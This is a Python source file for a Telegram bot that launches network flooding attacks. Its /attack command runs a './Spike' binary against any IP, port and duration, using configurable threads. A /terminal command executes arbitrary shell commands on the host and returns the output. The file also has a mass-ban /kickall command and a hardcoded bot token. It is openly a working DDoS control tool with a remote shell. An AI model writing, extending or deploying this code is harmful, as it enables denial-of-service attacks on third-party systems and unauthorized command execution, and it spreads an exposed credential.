import os
import json
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
from telegram.error import TelegramError
from telegram.constants import ChatMemberStatus

# ==== Configuration ====
TELEGRAM_BOT_TOKEN = '7826805459:AAFv42oAhypOTC02e6kWk1Astp_1PcW3h0Y'
ALLOWED_USER_ID = 6479495033  # Your user ID

DEFAULT_THREADS = 10
MAX_DURATION = 300  # seconds

ALLOWED_GROUPS_FILE = 'allowed_groups.json'

# ==== Persistent Storage ====
def load_allowed_groups():
    try:
        with open(ALLOWED_GROUPS_FILE, 'r') as f:
            return set(map(int, json.load(f)))
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

def save_allowed_groups():
    with open(ALLOWED_GROUPS_FILE, 'w') as f:
        json.dump(list(allowed_groups), f)

allowed_groups = load_allowed_groups()

# ==== Runtime Memory ====
known_user_ids = set()
user_threads = {}
user_max_duration = {}

# ==== Command Handlers ====

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if update.effective_chat.type != "private":
        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Commands:*\n"
            "`/attack <ip> <port> <duration>`\n"
            "`/setthreads <number>`\n"
            "`/setmaxduration <seconds>`\n"
            "`/terminal <command>`\n"
            "`/kickall`\n"
            "`/addgroup <group_id>`\n"
            "`/removegroup <group_id>`\n"
            "*Let the war begin! ⚔️💥*"
        )
        await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
    else:
        await update.message.reply_text("⚠️ This bot only works in groups.")

async def run_attack(chat_id, ip, port, duration, threads, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} {threads}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        await context.bot.send_message(chat_id=chat_id, text="✅ Attack Completed!", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if update.effective_chat.type == "private":
        await update.message.reply_text("⚠️ Use this command in a group.")
        return

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    if chat_id not in allowed_groups:
        await update.message.reply_text("⚠️ This command is not allowed in this group.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args
    if not port.isdigit() or not duration.isdigit():
        await update.message.reply_text("❗ Port and duration must be numbers.")
        return

    threads = user_threads.get(user_id, DEFAULT_THREADS)
    max_duration = user_max_duration.get(user_id, MAX_DURATION)

    if int(duration) > max_duration:
        await update.message.reply_text(f"⚠️ Max duration is {max_duration} seconds.")
        return

    await update.message.reply_text(f"🎯 Attack launched on {ip}:{port} for {duration}s with {threads} threads.")
    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))

async def set_threads(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /setthreads <number>")
        return

    user_threads[user_id] = int(context.args[0])
    await update.message.reply_text(f"✅ Threads set to {context.args[0]}.")

async def set_max_duration(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /setmaxduration <seconds>")
        return

    user_max_duration[user_id] = int(context.args[0])
    await update.message.reply_text(f"✅ Max duration set to {context.args[0]} seconds.")

async def terminal(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    command = " ".join(context.args)
    if not command:
        await update.message.reply_text("⚠️ Usage: /terminal <command>")
        return

    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = (stdout + stderr).decode().strip()

        if not output:
            output = "✅ Command executed with no output."

        await context.bot.send_message(chat_id=chat_id, text=f"```\n{output[:4000]}\n```", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def kick_all(update: Update, context: CallbackContext):
    chat = update.effective_chat
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    admins = await context.bot.get_chat_administrators(chat.id)
    admin_ids = {admin.user.id for admin in admins}

    if context.bot.id not in admin_ids:
        await update.message.reply_text("❌ I must be an admin to kick users.")
        return

    kicked = 0
    for uid in list(known_user_ids):
        if uid in admin_ids or uid == ALLOWED_USER_ID:
            continue
        try:
            await context.bot.ban_chat_member(chat.id, uid)
            kicked += 1
        except TelegramError:
            continue

    await update.message.reply_text(f"✅ Kicked {kicked} users.")

async def add_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    if not context.args or not context.args[0].lstrip('-').isdigit():
        await update.message.reply_text("⚠️ Usage: /addgroup <group_id>")
        return

    group_id = int(context.args[0])
    allowed_groups.add(group_id)
    save_allowed_groups()
    await update.message.reply_text(f"✅ Group {group_id} added.")

async def remove_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return

    if not context.args or not context.args[0].lstrip('-').isdigit():
        await update.message.reply_text("⚠️ Usage: /removegroup <group_id>")
        return

    group_id = int(context.args[0])
    allowed_groups.discard(group_id)
    save_allowed_groups()
    await update.message.reply_text(f"✅ Group {group_id} removed.")

async def track_users(update: Update, context: CallbackContext):
    if update.effective_user:
        known_user_ids.add(update.effective_user.id)

async def new_members(update: Update, context: CallbackContext):
    for user in update.message.new_chat_members:
        known_user_ids.add(user.id)

# ==== Main Entrypoint ====

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("setthreads", set_threads))
    application.add_handler(CommandHandler("setmaxduration", set_max_duration))
    application.add_handler(CommandHandler("terminal", terminal))
    application.add_handler(CommandHandler("kickall", kick_all))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("removegroup", remove_group))
    application.add_handler(MessageHandler(filters.ALL, track_users))
    application.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, new_members))

    application.run_polling()

if __name__ == '__main__':
    main()
